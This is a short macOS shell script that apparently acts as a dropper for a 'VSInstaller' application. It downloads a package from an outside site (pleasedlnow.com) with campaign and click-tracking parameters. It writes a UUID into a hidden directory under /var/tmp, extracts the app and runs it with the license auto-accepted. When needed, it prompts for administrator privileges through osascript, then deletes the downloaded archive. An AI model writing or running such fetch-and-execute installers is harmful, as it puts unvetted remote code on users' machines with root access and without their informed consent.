#!/bin/sh

tmpfile="/private/tmp/VSInstaller.tgz"
uuid=$(python  -c 'import uuid; print str(uuid.uuid1()).upper()')
stamp=$(python  -c 'import uuid; print str(uuid.uuid1()).upper()')
cid=$1
if [ -z "$1" ]; then
	cid="DP6090"
fi
curl -L -o $tmpfile "http://pleasedlnow.com/static/get-pkg?ns=1&dc_id=$cid&click_id=___$stamp"
mkdir -p /var/tmp/.vsinstaller/
echo '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
        <key>uuid</key>
        <string>'$uuid'</string>
</dict>
</plist>' >> /var/tmp/.vsinstaller/.uuid.plist
tar -xvzf /private/tmp/VSInstaller.tgz -C /private/tmp/
if [ "$EUID" -ne 0 ]; then
        osascript -e "do shell script \"/private/tmp/VSInstaller.app/Contents/MacOS/VSInstaller --agreetolicense\" with administrator privileges" 
else
	/private/tmp/VSInstaller.app/Contents/MacOS/VSInstaller --agreetolicense
fi
rm -rf $tmpfile